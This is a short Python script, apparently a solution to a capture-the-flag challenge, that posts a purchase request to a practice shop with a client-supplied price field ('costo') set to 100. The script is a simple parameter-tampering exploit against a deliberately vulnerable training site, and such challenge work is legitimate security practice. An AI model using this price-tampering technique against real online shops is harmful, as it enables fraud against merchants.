import requests as r

url = 'http://shops.challs.olicyber.it/buy.php'
print(r.post(
    url,
    data={'costo': '100', 'id': '2'}
).text)